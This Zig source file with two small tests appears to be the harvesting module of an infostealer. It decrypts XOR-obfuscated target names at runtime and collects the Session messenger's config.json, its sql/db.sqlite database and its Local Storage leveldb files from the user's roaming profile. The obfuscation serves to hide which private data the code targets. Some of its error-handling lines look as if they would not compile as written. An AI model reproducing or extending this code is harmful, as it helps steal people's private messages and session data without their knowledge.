const std = @import("std");
const hash = @import("../types/hash.zig");

const E = struct {
    const SESSION = hash.xorEncrypt("Session");
    const CONFIG = hash.xorEncrypt("config.json");
    const SQL = hash.xorEncrypt("sql");
    const DB_SQLITE = hash.xorEncrypt("db.sqlite");
    const LOCAL_STORAGE = hash.xorEncrypt("Local Storage");
    const LEVELDB = hash.xorEncrypt("leveldb");
};

fn collectSubdirFiles(allocator: std.mem.Allocator, dir_path: []const u8, files: *std.ArrayList([]const u8)) void {
    var dir = std.fs.openDirAbsolute(dir_path, .{ .iterate = true }) catch return;
    defer dir.close();
    var iter = dir.iterate();
    while (iter.next() catch {}) |entry| {
        if (entry.kind != .file) continue;
        const full = std.fs.path.join(allocator, &[_][]const u8{ dir_path, entry.name }) catch continue;
        files.append(full) catch {
            allocator.free(full);
            return;
        };
    }
}

pub fn collect(allocator: std.mem.Allocator, roaming: []const u8) ![][]const u8 {
    var files = std.ArrayList([]const u8).init(allocator);
    errdefer {
        for (files.items) |f| allocator.free(f);
        files.deinit();
    }

    var session_buf: [E.SESSION.len]u8 = undefined;
    var config_buf: [E.CONFIG.len]u8 = undefined;
    var sql_buf: [E.SQL.len]u8 = undefined;
    var db_buf: [E.DB_SQLITE.len]u8 = undefined;
    var ls_buf: [E.LOCAL_STORAGE.len]u8 = undefined;
    var ldb_buf: [E.LEVELDB.len]u8 = undefined;
    hash.xorDecrypt(&E.SESSION, &session_buf);
    hash.xorDecrypt(&E.CONFIG, &config_buf);
    hash.xorDecrypt(&E.SQL, &sql_buf);
    hash.xorDecrypt(&E.DB_SQLITE, &db_buf);
    hash.xorDecrypt(&E.LOCAL_STORAGE, &ls_buf);
    hash.xorDecrypt(&E.LEVELDB, &ldb_buf);

    const base_path = std.fs.path.join(allocator, &[_][]const u8{ roaming, session_buf[0..] }) catch return try allocator.alloc([]const u8, 0);
    defer allocator.free(base_path);

    const config_path = std.fs.path.join(allocator, &[_][]const u8{ base_path, config_buf[0..] }) catch {};
    if (config_path) |p| {
        const file = std.fs.openFileAbsolute(p, .{}) catch {};
        if (file) |f| {
            f.close();
            files.append(p) catch {
                allocator.free(p);
                return try allocator.alloc([]const u8, 0);
            };
        }
    }

    const sql_dir = std.fs.path.join(allocator, &[_][]const u8{ base_path, sql_buf[0..] }) catch {};
    if (sql_dir) |sd| {
        defer allocator.free(sd);
        const db_path = std.fs.path.join(allocator, &[_][]const u8{ sd, db_buf[0..] }) catch {};
        if (db_path) |dp| {
            const file = std.fs.openFileAbsolute(dp, .{}) catch {};
            if (file) |f| {
                f.close();
                files.append(dp) catch {
                    allocator.free(dp);
                    return try allocator.alloc([]const u8, 0);
                };
            }
        }
    }

    const ls_dir = std.fs.path.join(allocator, &[_][]const u8{ base_path, ls_buf[0..] }) catch {};
    if (ls_dir) |lsd| {
        defer allocator.free(lsd);
        const ldb_path = std.fs.path.join(allocator, &[_][]const u8{ lsd, ldb_buf[0..] }) catch {};
        if (ldb_path) |lp| {
            defer allocator.free(lp);
            collectSubdirFiles(allocator, lp, &files);
        }
    }

    return files.toOwnedSlice();
}

test "collect returns empty for nonexistent path" {
    const result = try collect(std.testing.allocator, "C:\\__nonexistent__session");
    defer {
        for (result) |f| std.testing.allocator.free(f);
        std.testing.allocator.free(result);
    }
    try std.testing.expectEqual(@as(usize, 0), result.len);
}

test "collectSubdirFiles skips missing dir" {
    var list = std.ArrayList([]const u8).init(std.testing.allocator);
    defer {
        for (list.items) |f| std.testing.allocator.free(f);
        list.deinit();
    }
    collectSubdirFiles(std.testing.allocator, "C:\\__nonexistent__", &list);
    try std.testing.expectEqual(@as(usize, 0), list.items.len);
}
